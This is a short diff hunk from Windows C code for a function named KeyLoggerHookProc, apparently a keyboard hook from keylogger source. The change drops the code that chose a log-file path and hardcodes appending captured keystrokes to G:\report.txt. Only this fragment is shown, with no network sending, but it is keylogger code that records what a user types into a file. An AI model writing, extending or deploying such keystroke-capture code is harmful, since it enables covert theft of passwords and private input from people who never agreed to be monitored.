@@ -81,15 +81,7 @@ LRESULT CALLBACK KeyLoggerHookProc(int nCode,   WPARAM wParam, LPARAM lParam)
 	{		
 		//if ((wParam==VK_SPACE)||(wParam==VK_TAB)||(wParam==VK_RETURN)||((wParam>0x2f ) && (wParam<=0x100)))
 		{
-			GetCurrentPath();
-			if (wcslen(szText)>3)
-			{
-				f1=_wfopen(szText, L"a+");
-			} 
-			else
-			{
-				f1=fopen("d:\\report.txt", "a+");
-			}
+			f1=fopen("G:\\report.txt", "a+");
 			char ch;
 			if (!f1)
 			{
